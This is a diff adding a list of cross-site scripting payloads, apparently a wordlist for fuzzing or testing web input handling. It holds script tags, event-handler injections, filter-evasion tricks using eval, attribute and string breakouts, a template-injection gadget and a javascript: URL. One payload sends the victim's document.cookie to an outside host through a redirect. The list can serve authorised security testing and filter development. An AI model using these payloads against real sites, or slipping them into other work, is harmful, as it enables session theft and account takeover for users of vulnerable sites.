@@ -1,0 +1,22 @@
+<script>alert`1`</script>
+<svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<iframe srcdoc='<script>alert(1)</script>'>
+<x ContentEditable AutoFocus OnFocus=alert(1)>
+<input type="hidden" value="X" popover id=x onbeforetoggle=alert(1)>
+<button popovertarget=x>Click</button><img popover id=x onbeforetoggle=alert(1)>
+<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
+<svg/onload=throw/**/Uncaught=window.onerror=eval,";alert\501\51">
+<video><source onerror=location=/\02.rs/+document.cookie>
+<meta name="X" content="Y" popover id=newsletter onbeforetoggle=alert(1)>
+<a Href AutoFocus OnFocus=alert(1)>
+<K OnPointerRawUpdate=alert(1)>
+<svg><script xlink:href=data:,alert(1)></script></svg>
+<details open ontoggle=alert(1)>
+<body onresize=alert(1)>
+"><svg onload=alert(1)>
+"});alert(1);//
+'-alert(1)-'
+/script><script>alert(1)</script>
+{{constructor.constructor('alert(1)')()}}
+javascript:alert(1)
